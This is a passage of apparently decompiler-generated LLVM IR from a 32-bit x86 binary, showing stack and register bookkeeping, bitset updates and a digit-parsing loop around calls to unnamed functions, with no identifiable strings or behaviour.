  %v2_804977e = udiv i32 %v3_8049773, 32
  store i32 %v2_804977e, i32* %edx.global-to-local, align 4
  %v0_8049781 = load i32, i32* @esp, align 4
  %v2_8049781 = mul nuw nsw i32 %v2_804977e, 4
  %v3_8049781 = add nuw nsw i32 %v2_8049781, 20740
  %v4_8049781 = add i32 %v3_8049781, %v0_8049781
  %v5_8049781 = inttoptr i32 %v4_8049781 to i32*
  %v6_8049781 = load i32, i32* %v5_8049781, align 4
  %v9_8049781 = shl i32 1, %v1_804977b
  %v12_8049781 = or i32 %v6_8049781, %v9_8049781
  store i32 %v12_8049781, i32* %v5_8049781, align 4
  %v0_8049789 = load i32, i32* @esi, align 4
  %v1_8049789 = add i32 %v0_8049789, -1440
  %v2_8049789 = inttoptr i32 %v1_8049789 to i32*
  %v3_8049789 = load i32, i32* %v2_8049789, align 4
  store i32 %v3_8049789, i32* %eax.global-to-local, align 4
  %v1_804978f = load i32, i32* @esp, align 4
  %v2_804978f = add i32 %v1_804978f, 72
  %v3_804978f = inttoptr i32 %v2_804978f to i32*
  %v4_804978f = load i32, i32* %v3_804978f, align 4
  %v5_804978f = sub i32 %v3_8049789, %v4_804978f
  %v11_804978f = xor i32 %v4_804978f, %v3_8049789
  %v12_804978f = xor i32 %v5_804978f, %v3_8049789
  %v13_804978f = and i32 %v12_804978f, %v11_804978f
  %v14_804978f = icmp slt i32 %v13_804978f, 0
  %v15_804978f = icmp eq i32 %v5_804978f, 0
  store i1 %v15_804978f, i1* %zf.global-to-local, align 1
  %v16_804978f = icmp slt i32 %v5_804978f, 0
  %v3_8049793 = icmp ne i1 %v16_804978f, %v14_804978f
  %v4_8049793 = or i1 %v15_804978f, %v3_8049793
  br i1 %v4_8049793, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_804979e:                             ; preds = %dec_label_pc_8048c10
  %v2_804979e = add i32 %v0_8048c1d, 12
  %v3_804979e = inttoptr i32 %v2_804979e to i32*
  store i32 %v3_8048bde, i32* %v3_804979e, align 4
  %v2_804979f = add i32 %v0_8048c1d, 8
  %v3_804979f = inttoptr i32 %v2_804979f to i32*
  store i32 %v3_8048bde, i32* %v3_804979f, align 4
  %v0_80497a0 = load i32, i32* @esi, align 4
  %v2_80497a0 = add i32 %v0_8048c1d, 4
  %v3_80497a0 = inttoptr i32 %v2_80497a0 to i32*
  store i32 %v0_80497a0, i32* %v3_80497a0, align 4
  %v1_80497a1 = add i32 %v0_8048c1d, 112
  %v2_80497a1 = inttoptr i32 %v1_80497a1 to i32*
  %v3_80497a1 = load i32, i32* %v2_80497a1, align 4
  store i32 %v3_80497a1, i32* @ebx, align 4
  %v3_80497a5 = inttoptr i32 %v0_8048c1d to i32*
  store i32 %v3_80497a1, i32* %v3_80497a5, align 4
  %v3_80497a6 = call i32 @function_8052600(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80497a6, i32* %eax.global-to-local, align 4
  %v0_80497ab = load i32, i32* @esp, align 4
  %v1_80497ab = add i32 %v0_80497ab, 16
  %v6_80497ab = icmp eq i32 %v1_80497ab, 0
  store i1 %v6_80497ab, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048c28

dec_label_pc_80497b3:                             ; preds = %dec_label_pc_8048d89
  %v1_80497b3 = call i32 @function_80530b9(i32 %stack_var_-20924.0.ph)
  store i32 %v1_80497b3, i32* %eax.global-to-local, align 4
  store i32 %v1_80497b3, i32* @ebx, align 4
  br label %dec_label_pc_80497ba

dec_label_pc_80497ba:                             ; preds = %dec_label_pc_80497ed, %dec_label_pc_80497b3
  %v0_80497ba = phi i32 [ %v1_80497b3, %dec_label_pc_80497b3 ], [ %v0_80497ba.pre, %dec_label_pc_80497ed ]
  %v1_80497ba = inttoptr i32 %v0_80497ba to i32*
  store i32 0, i32* %v1_80497ba, align 4
  %v0_80497c0 = load i32, i32* @esp, align 4
  %v1_80497c0 = add i32 %v0_80497c0, -4
  %v2_80497c0 = inttoptr i32 %v1_80497c0 to i32*
  store i32 16384, i32* %v2_80497c0, align 4
  %v1_80497c5 = add i32 %v0_80497c0, -8
  %v2_80497c5 = inttoptr i32 %v1_80497c5 to i32*
  store i32 10240, i32* %v2_80497c5, align 4
  %v1_80497ca = add i32 %v0_80497c0, 131
  store i32 %v1_80497ca, i32* %ecx.global-to-local, align 4
  %v2_80497d1 = add i32 %v0_80497c0, -12
  %v3_80497d1 = inttoptr i32 %v2_80497d1 to i32*
  store i32 %v1_80497ca, i32* %v3_80497d1, align 4
  %v1_80497d2 = add i32 %v0_80497c0, 92
  %v2_80497d2 = inttoptr i32 %v1_80497d2 to i32*
  %v3_80497d2 = load i32, i32* %v2_80497d2, align 4
  store i32 %v3_80497d2, i32* %eax.global-to-local, align 4
  %v1_80497d6 = add i32 %v3_80497d2, -1452
  %v2_80497d6 = inttoptr i32 %v1_80497d6 to i32*
  %v3_80497d6 = load i32, i32* %v2_80497d6, align 4
  %v2_80497dc = add i32 %v0_80497c0, -16
  %v3_80497dc = inttoptr i32 %v2_80497dc to i32*
  store i32 %v3_80497d6, i32* %v3_80497dc, align 4
  %v0_80497dd = call i32 @function_805324e()
  store i32 %v0_80497dd, i32* %eax.global-to-local, align 4
  %v0_80497e2 = load i32, i32* @esp, align 4
  %v1_80497e2 = add i32 %v0_80497e2, 16
  %v1_80497e5 = icmp eq i32 %v0_80497dd, 0
  store i1 %v1_80497e5, i1* %zf.global-to-local, align 1
  br i1 %v1_80497e5, label %dec_label_pc_8049b04, label %dec_label_pc_80497ed

dec_label_pc_80497ed:                             ; preds = %dec_label_pc_80497ba
  %v1_80497ed = add i32 %v0_80497dd, 1
  %v8_80497ed = icmp eq i32 %v1_80497ed, 0
  store i1 %v8_80497ed, i1* %zf.global-to-local, align 1
  store i32 %v1_80497ed, i32* %eax.global-to-local, align 4
  %v1_80497ee = icmp eq i1 %v8_80497ed, false
  %v0_80497ba.pre = load i32, i32* @ebx, align 4
  br i1 %v1_80497ee, label %dec_label_pc_80497ba, label %dec_label_pc_80497f0

dec_label_pc_80497f0:                             ; preds = %dec_label_pc_80497ed
  %v1_80497f0 = inttoptr i32 %v0_80497ba.pre to i32*
  %v2_80497f0 = load i32, i32* %v1_80497f0, align 4
  %v11_80497f0 = icmp eq i32 %v2_80497f0, 11
  store i1 %v11_80497f0, i1* %zf.global-to-local, align 1
  br i1 %v11_80497f0, label %dec_label_pc_8049c31, label %dec_label_pc_80497f9

dec_label_pc_80497f9:                             ; preds = %dec_label_pc_80497f0, %dec_label_pc_8049b04
  %v0_80497f9 = phi i32 [ %v1_80497e2, %dec_label_pc_80497f0 ], [ %v0_80497f9.pre, %dec_label_pc_8049b04 ]
  %v9_80497f9 = icmp eq i32 %v0_80497f9, 12
  store i1 %v9_80497f9, i1* %zf.global-to-local, align 1
  %v1_80497fc = add i32 %v0_80497f9, 92
  %v2_80497fc = inttoptr i32 %v1_80497fc to i32*
  %v3_80497fc = load i32, i32* %v2_80497fc, align 4
  store i32 %v3_80497fc, i32* %edx.global-to-local, align 4
  %v1_8049800 = add i32 %v3_80497fc, -1452
  %v2_8049800 = inttoptr i32 %v1_8049800 to i32*
  %v3_8049800 = load i32, i32* %v2_8049800, align 4
  store i32 %v3_8049800, i32* %ecx.global-to-local, align 4
  %v2_8049806 = add i32 %v0_80497f9, -16
  %v3_8049806 = inttoptr i32 %v2_8049806 to i32*
  store i32 %v3_8049800, i32* %v3_8049806, align 4
  %v1_8049807 = call i32 @function_8052b81(i32 %stack_var_-20924.0.ph)
  store i32 %v1_8049807, i32* %eax.global-to-local, align 4
  %v0_804980c = load i32, i32* @esp, align 4
  %v1_804980c = add i32 %v0_804980c, 108
  %v2_804980c = inttoptr i32 %v1_804980c to i32*
  %v3_804980c = load i32, i32* %v2_804980c, align 4
  store i32 %v3_804980c, i32* %ecx.global-to-local, align 4
  %v6_8049810 = icmp eq i32 %v0_804980c, -16
  store i1 %v6_8049810, i1* %zf.global-to-local, align 1
  %v1_8049813 = add i32 %v3_804980c, -1452
  %v2_8049813 = inttoptr i32 %v1_8049813 to i32*
  store i32 -1, i32* %v2_8049813, align 4
  %v0_804981d = load i32, i32* %ecx.global-to-local, align 4
  %v1_804981d = add i32 %v0_804981d, -1448
  %v2_804981d = inttoptr i32 %v1_804981d to i8*
  store i8 0, i8* %v2_804981d, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049829:                             ; preds = %dec_label_pc_8048557
  %v1_8049829 = add i32 %v0_80485a5, -1440
  %v2_8049829 = inttoptr i32 %v1_8049829 to i32*
  %v3_8049829 = load i32, i32* %v2_8049829, align 4
  %v1_8049831 = urem i32 %v3_8049829, 32
  store i32 %v1_8049831, i32* %eax.global-to-local, align 4
  %v2_8049834 = udiv i32 %v3_8049829, 32
  store i32 %v2_8049834, i32* %edx.global-to-local, align 4
  %v0_8049837 = load i32, i32* @esp, align 4
  %v2_8049837 = mul nuw nsw i32 %v2_8049834, 4
  %v3_8049837 = add nuw nsw i32 %v2_8049837, 20740
  %v4_8049837 = add i32 %v3_8049837, %v0_8049837
  %v5_8049837 = inttoptr i32 %v4_8049837 to i32*
  %v6_8049837 = load i32, i32* %v5_8049837, align 4
  %v9_8049837 = shl i32 1, %v1_8049831
  %v12_8049837 = or i32 %v6_8049837, %v9_8049837
  store i32 %v12_8049837, i32* %v5_8049837, align 4
  %v0_804983f = load i32, i32* @esi, align 4
  %v1_804983f = add i32 %v0_804983f, -1440
  %v2_804983f = inttoptr i32 %v1_804983f to i32*
  %v3_804983f = load i32, i32* %v2_804983f, align 4
  store i32 %v3_804983f, i32* %eax.global-to-local, align 4
  %v1_8049845 = load i32, i32* @esp, align 4
  %v2_8049845 = add i32 %v1_8049845, 72
  %v3_8049845 = inttoptr i32 %v2_8049845 to i32*
  %v4_8049845 = load i32, i32* %v3_8049845, align 4
  %v5_8049845 = sub i32 %v3_804983f, %v4_8049845
  %v11_8049845 = xor i32 %v4_8049845, %v3_804983f
  %v12_8049845 = xor i32 %v5_8049845, %v3_804983f
  %v13_8049845 = and i32 %v12_8049845, %v11_8049845
  %v14_8049845 = icmp slt i32 %v13_8049845, 0
  %v15_8049845 = icmp eq i32 %v5_8049845, 0
  store i1 %v15_8049845, i1* %zf.global-to-local, align 1
  %v16_8049845 = icmp slt i32 %v5_8049845, 0
  %v3_8049849 = icmp ne i1 %v16_8049845, %v14_8049845
  %v4_8049849 = or i1 %v15_8049845, %v3_8049849
  br i1 %v4_8049849, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_8049854:                             ; preds = %dec_label_pc_80493fd, %dec_label_pc_80493d2
  %v1_8049854.in = phi i32 [ %v0_8049452, %dec_label_pc_80493fd ], [ %v0_80493f3, %dec_label_pc_80493d2 ]
  %v0_8049854 = load i32, i32* @edi, align 4
  %v2_8049854 = add i32 %v1_8049854.in, 12
  %v3_8049854 = inttoptr i32 %v2_8049854 to i32*
  store i32 %v0_8049854, i32* %v3_8049854, align 4
  %v0_8049855 = load i32, i32* @edi, align 4
  %v2_8049855 = add i32 %v1_8049854.in, 8
  %v3_8049855 = inttoptr i32 %v2_8049855 to i32*
  store i32 %v0_8049855, i32* %v3_8049855, align 4
  %v1_8049856 = add i32 %v1_8049854.in, 4
  %v2_8049856 = inttoptr i32 %v1_8049856 to i32*
  store i32 0, i32* %v2_8049856, align 4
  %v2_8049858 = inttoptr i32 %v1_8049854.in to i32*
  store i32 37, i32* %v2_8049858, align 4
  %v3_804985a = call i32 @function_8051be0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_804985a, i32* %eax.global-to-local, align 4
  %v0_804985f = load i32, i32* @esp, align 4
  %v9_804985f = icmp eq i32 %v0_804985f, -12
  store i1 %v9_804985f, i1* %zf.global-to-local, align 1
  %v2_8049862 = add i32 %v0_804985f, 8
  %v3_8049862 = inttoptr i32 %v2_8049862 to i32*
  store i32 %v3_804985a, i32* %v3_8049862, align 4
  %v1_8049863 = add i32 %v0_804985f, 120
  %v2_8049863 = inttoptr i32 %v1_8049863 to i32*
  %v3_8049863 = load i32, i32* %v2_8049863, align 4
  %v2_8049867 = add i32 %v0_804985f, 4
  %v3_8049867 = inttoptr i32 %v2_8049867 to i32*
  store i32 %v3_8049863, i32* %v3_8049867, align 4
  %v1_8049868 = add i32 %v0_804985f, 147
  store i32 %v1_8049868, i32* @ecx, align 4
  %v3_804986f = inttoptr i32 %v0_804985f to i32*
  store i32 %v1_8049868, i32* %v3_804986f, align 4
  %v4_8049870 = call i32 @function_80528d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049875 = load i32, i32* @esp, align 4
  %v1_8049875 = add i32 %v0_8049875, 16
  %v1_8049878 = add i32 %v4_8049870, 1
  %v8_8049878 = icmp eq i32 %v1_8049878, 0
  store i1 %v8_8049878, i1* %zf.global-to-local, align 1
  store i32 %v1_8049878, i32* %eax.global-to-local, align 4
  br i1 %v8_8049878, label %dec_label_pc_8049a77, label %dec_label_pc_804987f

dec_label_pc_804987f:                             ; preds = %dec_label_pc_8049854
  %v0_804987f = load i32, i32* @ebx, align 4
  %v2_804987f = add i32 %v0_8049875, 12
  %v3_804987f = inttoptr i32 %v2_804987f to i32*
  store i32 %v0_804987f, i32* %v3_804987f, align 4
  %v0_8049880 = load i32, i32* @ebx, align 4
  %v2_8049880 = add i32 %v0_8049875, 8
  %v3_8049880 = inttoptr i32 %v2_8049880 to i32*
  store i32 %v0_8049880, i32* %v3_8049880, align 4
  %v1_8049881 = add i32 %v0_8049875, 4
  %v2_8049881 = inttoptr i32 %v1_8049881 to i32*
  store i32 0, i32* %v2_8049881, align 4
  %v2_8049883 = inttoptr i32 %v0_8049875 to i32*
  store i32 37, i32* %v2_8049883, align 4
  %v3_8049885 = call i32 @function_8051be0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049885, i32* %eax.global-to-local, align 4
  %v0_804988a = load i32, i32* @esp, align 4
  %v9_804988a = icmp eq i32 %v0_804988a, -12
  store i1 %v9_804988a, i1* %zf.global-to-local, align 1
  %v2_804988d = add i32 %v0_804988a, 8
  %v3_804988d = inttoptr i32 %v2_804988d to i32*
  store i32 %v3_8049885, i32* %v3_804988d, align 4
  %v1_804988e = add i32 %v0_804988a, 120
  %v2_804988e = inttoptr i32 %v1_804988e to i32*
  %v3_804988e = load i32, i32* %v2_804988e, align 4
  store i32 %v3_804988e, i32* @ecx, align 4
  %v2_8049892 = add i32 %v0_804988a, 4
  %v3_8049892 = inttoptr i32 %v2_8049892 to i32*
  store i32 %v3_804988e, i32* %v3_8049892, align 4
  %v1_8049893 = add i32 %v0_804988a, 147
  store i32 %v1_8049893, i32* %eax.global-to-local, align 4
  %v3_804989a = inttoptr i32 %v0_804988a to i32*
  store i32 %v1_8049893, i32* %v3_804989a, align 4
  %v4_804989b = call i32 @function_80528d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804989b, i32* %eax.global-to-local, align 4
  %v0_80498a0 = load i32, i32* @esp, align 4
  %v6_80498a0 = icmp eq i32 %v0_80498a0, -16
  store i1 %v6_80498a0, i1* %zf.global-to-local, align 1
  store i32 %v4_804989b, i32* %ebx.global-to-local, align 4
  %v3_80498a5 = add i32 %v4_804989b, 147
  %v4_80498a5 = add i32 %v3_80498a5, %v0_80498a0
  %v5_80498a5 = inttoptr i32 %v4_80498a5 to i8*
  %v6_80498a5 = load i8, i8* %v5_80498a5, align 1
  %v12_80498a5 = icmp eq i8 %v6_80498a5, 32
  %v1_80498ad = zext i1 %v12_80498a5 to i32
  %v1_80498b0 = add i32 %v0_80498a0, 147
  store i32 %v1_80498b0, i32* %esi.global-to-local, align 4
  store i32 %v1_80498ad, i32* %eax.global-to-local, align 4
  %v1_80498bc = add i32 %v0_80498a0, 12
  %v2_80498bc = inttoptr i32 %v1_80498bc to i32*
  store i32 2, i32* %v2_80498bc, align 4
  %v1_80498be = add i32 %v0_80498a0, 8
  %v2_80498be = inttoptr i32 %v1_80498be to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80554a6.10 to i32), i32* %v2_80498be, align 4
  %v0_80498c3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80498c3 = load i32, i32* %eax.global-to-local, align 4
  %v2_80498c3 = add i32 %v1_80498c3, %v0_80498c3
  store i32 %v2_80498c3, i32* @ebx, align 4
  %v1_80498c5 = add i32 %v0_80498a0, 120
  %v2_80498c5 = inttoptr i32 %v1_80498c5 to i32*
  %v3_80498c5 = load i32, i32* %v2_80498c5, align 4
  %v2_80498c9 = sub i32 %v3_80498c5, %v2_80498c3
  store i32 %v2_80498c9, i32* %eax.global-to-local, align 4
  %v0_80498cb = load i32, i32* %esi.global-to-local, align 4
  %v2_80498cb = add i32 %v0_80498cb, %v2_80498c3
  %v12_80498cb = icmp eq i32 %v2_80498cb, 0
  store i1 %v12_80498cb, i1* %zf.global-to-local, align 1
  store i32 %v2_80498cb, i32* @esi, align 4
  %v2_80498cd = add i32 %v0_80498a0, 4
  %v3_80498cd = inttoptr i32 %v2_80498cd to i32*
  store i32 %v2_80498c9, i32* %v3_80498cd, align 4
  %v0_80498ce = load i32, i32* @esi, align 4
  %v3_80498ce = inttoptr i32 %v0_80498a0 to i32*
  store i32 %v0_80498ce, i32* %v3_80498ce, align 4
  %v0_80498cf = call i32 @function_8052690()
  store i32 %v0_80498cf, i32* %eax.global-to-local, align 4
  %v0_80498d4 = load i32, i32* @esp, align 4
  %v1_80498d4 = add i32 %v0_80498d4, 16
  store i32 %v0_80498cf, i32* @edi, align 4
  %v10_80498d9 = icmp eq i32 %v0_80498cf, -1
  store i1 %v10_80498d9, i1* %zf.global-to-local, align 1
  br i1 %v10_80498d9, label %dec_label_pc_8049a77, label %dec_label_pc_80498e2

dec_label_pc_80498e2:                             ; preds = %dec_label_pc_804987f
  %v10_80498e2 = icmp eq i32 %v0_80498cf, 1
  store i1 %v10_80498e2, i1* %zf.global-to-local, align 1
  %v7_80498e5 = icmp sgt i32 %v0_80498cf, 1
  br i1 %v7_80498e5, label %dec_label_pc_80498e7, label %dec_label_pc_80498ea

dec_label_pc_80498e7:                             ; preds = %dec_label_pc_80498e2
  %v1_80498e7 = add i32 %v0_80498cf, -2
  %v9_80498e7 = icmp eq i32 %v1_80498e7, 0
  store i1 %v9_80498e7, i1* %zf.global-to-local, align 1
  store i32 %v1_80498e7, i32* @edi, align 4
  br label %dec_label_pc_80498ea

dec_label_pc_80498ea:                             ; preds = %dec_label_pc_80498e2, %dec_label_pc_80498e7
  %v1_80498ea = add i32 %v0_80498d4, 20920
  store i32 %v1_80498ea, i32* %eax.global-to-local, align 4
  %v1_80498f1 = add i32 %v0_80498d4, 20916
  %v2_80498f1 = inttoptr i32 %v1_80498f1 to i32*
  store i32 0, i32* %v2_80498f1, align 4
  %v0_80498fc = load i32, i32* %eax.global-to-local, align 4
  %v1_80498fc = load i32, i32* @ebx, align 4
  %v2_80498fc = add i32 %v1_80498fc, %v0_80498fc
  %v12_80498fc = icmp eq i32 %v2_80498fc, 0
  store i1 %v12_80498fc, i1* %zf.global-to-local, align 1
  store i32 %v2_80498fc, i32* %eax.global-to-local, align 4
  %v0_80498fe = load i32, i32* @esi, align 4
  store i32 %v0_80498fe, i32* %edx.global-to-local, align 4
  %v1_8049900 = load i32, i32* @edi, align 4
  %v2_8049900 = add i32 %v2_80498fc, -20773
  %v3_8049900 = add i32 %v2_8049900, %v1_8049900
  %v4_8049900 = inttoptr i32 %v3_8049900 to i8*
  store i8 0, i8* %v4_8049900, align 1
  %v0_8049908 = load i32, i32* @esi, align 4
  %v1_8049908 = inttoptr i32 %v0_8049908 to i8*
  %v2_8049908 = load i8, i8* %v1_8049908, align 1
  %v3_8049908 = zext i8 %v2_8049908 to i32
  %v4_8049908 = load i32, i32* @ecx, align 4
  %v5_8049908 = and i32 %v4_8049908, -256
  %v6_8049908 = or i32 %v5_8049908, %v3_8049908
  store i32 %v6_8049908, i32* @ecx, align 4
  %v1_804990a = add i32 %v6_8049908, -48
  store i32 %v1_804990a, i32* %eax.global-to-local, align 4
  %v1_804990d = trunc i32 %v1_804990a to i8
  %v10_804990d = icmp eq i8 %v1_804990d, 9
  store i1 %v10_804990d, i1* %zf.global-to-local, align 1
  %tmp241 = icmp ult i8 %v1_804990d, 10
  br i1 %tmp241, label %dec_label_pc_8049911, label %dec_label_pc_8049928

dec_label_pc_8049911:                             ; preds = %dec_label_pc_80498ea
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8049913

dec_label_pc_8049913:                             ; preds = %dec_label_pc_8049913, %dec_label_pc_8049911
  %v0_8049913 = phi i32 [ %v0_804991b, %dec_label_pc_8049913 ], [ 0, %dec_label_pc_8049911 ]
  %v1_8049913 = add i32 %v0_8049913, 1
  %v8_8049913 = icmp eq i32 %v1_8049913, 0
  store i1 %v8_8049913, i1* %zf.global-to-local, align 1
  store i32 %v1_8049913, i32* %edx.global-to-local, align 4
  %v1_8049914 = load i32, i32* @esp, align 4
  %v2_8049914 = add i32 %v1_8049914, 20900
  %v3_8049914 = inttoptr i32 %v2_8049914 to i32*
  store i32 %v1_8049913, i32* %v3_8049914, align 4
  %v0_804991b = load i32, i32* %edx.global-to-local, align 4
  %v1_804991b = load i32, i32* @esi, align 4
  %v2_804991b = add i32 %v1_804991b, %v0_804991b
  %v3_804991b = inttoptr i32 %v2_804991b to i8*
  %v4_804991b = load i8, i8* %v3_804991b, align 1
  %v5_804991b = zext i8 %v4_804991b to i32
  %v6_804991b = load i32, i32* @ecx, align 4
  %v7_804991b = and i32 %v6_804991b, -256
  %v8_804991b = or i32 %v7_804991b, %v5_804991b
  store i32 %v8_804991b, i32* @ecx, align 4
  %v1_804991e = add i32 %v8_804991b, -48
  store i32 %v1_804991e, i32* %eax.global-to-local, align 4
  %v1_8049921 = trunc i32 %v1_804991e to i8
  %v10_8049921 = icmp eq i8 %v1_8049921, 9
  store i1 %v10_8049921, i1* %zf.global-to-local, align 1
  %tmp242 = icmp ult i8 %v1_8049921, 10
  br i1 %tmp242, label %dec_label_pc_8049913, label %dec_label_pc_8049925

dec_label_pc_8049925:                             ; preds = %dec_label_pc_8049913
  store i32 %v2_804991b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8049928

dec_label_pc_8049928:                             ; preds = %dec_label_pc_80498ea, %dec_label_pc_8049925
  %v0_8049928 = phi i32 [ %v6_8049908, %dec_label_pc_80498ea ], [ %v8_804991b, %dec_label_pc_8049925 ]
  %v3_8049928 = trunc i32 %v0_8049928 to i8
  %v4_8049928 = icmp eq i8 %v3_8049928, 0
  store i1 %v4_8049928, i1* %zf.global-to-local, align 1
  br i1 %v4_8049928, label %dec_label_pc_8049928.dec_label_pc_8049a77_crit_edge, label %dec_label_pc_8049930

dec_label_pc_8049928.dec_label_pc_8049a77_crit_edge: ; preds = %dec_label_pc_8049928
  %v0_8049a77.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049a77

dec_label_pc_8049930:                             ; preds = %dec_label_pc_8049928
  %v0_8049930 = load i32, i32* %edx.global-to-local, align 4
  %v1_8049930 = inttoptr i32 %v0_8049930 to i8*
  store i8 0, i8* %v1_8049930, align 1
  %v0_8049933 = load i32, i32* @esp, align 4
  %v1_8049933 = add i32 %v0_8049933, 20900
  %v2_8049933 = inttoptr i32 %v1_8049933 to i32*
  %v3_8049933 = load i32, i32* %v2_8049933, align 4
  store i32 %v3_8049933, i32* %edx.global-to-local, align 4
  %v1_804993a = add i32 %v3_8049933, 1
  store i32 %v1_804993a, i32* %eax.global-to-local, align 4
  store i32 %v1_804993a, i32* %v2_8049933, align 4
  %v0_8049944 = load i32, i32* @esi, align 4
  %v1_8049944 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049944 = add i32 %v1_8049944, %v0_8049944
  %v3_8049944 = inttoptr i32 %v2_8049944 to i8*
  %v4_8049944 = load i8, i8* %v3_8049944, align 1
  %v10_8049944 = icmp eq i8 %v4_8049944, 32
  store i1 %v10_8049944, i1* %zf.global-to-local, align 1
  br i1 %v10_8049944, label %dec_label_pc_8049ee6, label %dec_label_pc_804994e

dec_label_pc_804994e:                             ; preds = %dec_label_pc_8049930, %dec_label_pc_8049ee6
  %v0_8049951 = phi i32 [ %v0_8049944, %dec_label_pc_8049930 ], [ %v0_8049951.pre, %dec_label_pc_8049ee6 ]
  %v0_804994e = load i32, i32* @esp, align 4
  store i32 %v0_8049951, i32* %eax.global-to-local, align 4
  %v1_8049953 = add i32 %v0_804994e, 20900
  %v2_8049953 = inttoptr i32 %v1_8049953 to i32*
  %v3_8049953 = load i32, i32* %v2_8049953, align 4
  store i32 %v3_8049953, i32* %edx.global-to-local, align 4
  %v2_804995a = add i32 %v3_8049953, %v0_8049951
  %v12_804995a = icmp eq i32 %v2_804995a, 0
  store i1 %v12_804995a, i1* %zf.global-to-local, align 1
  store i32 %v2_804995a, i32* %eax.global-to-local, align 4
  %v2_804995c = add i32 %v0_804994e, -16
  %v3_804995c = inttoptr i32 %v2_804995c to i32*
  store i32 %v2_804995a, i32* %v3_804995c, align 4
  %v2_804995d = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_804995d, i32* %eax.global-to-local, align 4
  %v0_8049962 = load i32, i32* @esp, align 4
  %v1_8049965 = add i32 %v0_8049962, 8
  %v2_8049965 = inttoptr i32 %v1_8049965 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_80554b0.17 to i32), i32* %v2_8049965, align 4
  %v2_804996a = add i32 %v0_8049962, 4
  %v3_804996a = inttoptr i32 %v2_804996a to i32*
  store i32 %v2_804995d, i32* %v3_804996a, align 4
  %v1_804996b = add i32 %v0_8049962, 20916
  %v2_804996b = inttoptr i32 %v1_804996b to i32*
  %v3_804996b = load i32, i32* %v2_804996b, align 4
  store i32 %v3_804996b, i32* @ebp, align 4
  %v0_8049972 = load i32, i32* @esi, align 4
  %v2_8049974 = add i32 %v0_8049972, %v3_804996b
  %v12_8049974 = icmp eq i32 %v2_8049974, 0
  store i1 %v12_8049974, i1* %zf.global-to-local, align 1
  store i32 %v2_8049974, i32* %eax.global-to-local, align 4
  %v3_8049976 = inttoptr i32 %v0_8049962 to i32*
  store i32 %v2_8049974, i32* %v3_8049976, align 4
  %v4_8049977 = call i32 @function_80528d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804997c = load i32, i32* @esp, align 4
  %v1_804997c = add i32 %v0_804997c, 16
  %v1_804997f = add i32 %v4_8049977, 1
  %v8_804997f = icmp eq i32 %v1_804997f, 0
  store i1 %v8_804997f, i1* %zf.global-to-local, align 1
  store i32 %v1_804997f, i32* %eax.global-to-local, align 4
  br i1 %v8_804997f, label %dec_label_pc_80499c3, label %dec_label_pc_8049982

dec_label_pc_8049982:                             ; preds = %dec_label_pc_804994e
  %v0_8049985 = load i32, i32* @esi, align 4
  store i32 %v0_8049985, i32* %eax.global-to-local, align 4
  %v1_8049987 = add i32 %v0_804997c, 20916
  %v2_8049987 = inttoptr i32 %v1_8049987 to i32*
  %v3_8049987 = load i32, i32* %v2_8049987, align 4
  %v2_804998e = add i32 %v3_8049987, %v0_8049985
  %v12_804998e = icmp eq i32 %v2_804998e, 0
  store i1 %v12_804998e, i1* %zf.global-to-local, align 1
  store i32 %v2_804998e, i32* %eax.global-to-local, align 4
  %v3_8049990 = inttoptr i32 %v0_804997c to i32*
  store i32 %v2_804998e, i32* %v3_8049990, align 4
  %v2_8049991 = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_8049991, i32* %eax.global-to-local, align 4
  %v0_8049996 = load i32, i32* @esp, align 4
  %v1_8049999 = add i32 %v0_8049996, 8
  %v2_8049999 = inttoptr i32 %v1_8049999 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_80554b0.17 to i32), i32* %v2_8049999, align 4
  %v2_804999e = add i32 %v0_8049996, 4
  %v3_804999e = inttoptr i32 %v2_804999e to i32*
  store i32 %v2_8049991, i32* %v3_804999e, align 4
  %v1_804999f = add i32 %v0_8049996, 20916
  %v2_804999f = inttoptr i32 %v1_804999f to i32*
  %v3_804999f = load i32, i32* %v2_804999f, align 4
  store i32 %v3_804999f, i32* @ecx, align 4
  %v0_80499a6 = load i32, i32* @esi, align 4
  %v2_80499a8 = add i32 %v0_80499a6, %v3_804999f
  %v12_80499a8 = icmp eq i32 %v2_80499a8, 0
  store i1 %v12_80499a8, i1* %zf.global-to-local, align 1
  store i32 %v2_80499a8, i32* %eax.global-to-local, align 4
  %v3_80499aa = inttoptr i32 %v0_8049996 to i32*
  store i32 %v2_80499a8, i32* %v3_80499aa, align 4
  %v4_80499ab = call i32 @function_80528d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80499ab, i32* %eax.global-to-local, align 4
  %v0_80499b0 = load i32, i32* @esp, align 4
  %v1_80499b0 = add i32 %v0_80499b0, 20916
  %v2_80499b0 = inttoptr i32 %v1_80499b0 to i32*
  %v3_80499b0 = load i32, i32* %v2_80499b0, align 4
  %v2_80499b7 = add i32 %v3_80499b0, %v4_80499ab
  store i32 %v2_80499b7, i32* %edx.global-to-local, align 4
  store i32 %v2_80499b7, i32* %v2_80499b0, align 4
  %v0_80499c0 = load i32, i32* @esp, align 4
  %v1_80499c0 = add i32 %v0_80499c0, 16
  %v6_80499c0 = icmp eq i32 %v1_80499c0, 0
  store i1 %v6_80499c0, i1* %zf.global-to-local, align 1
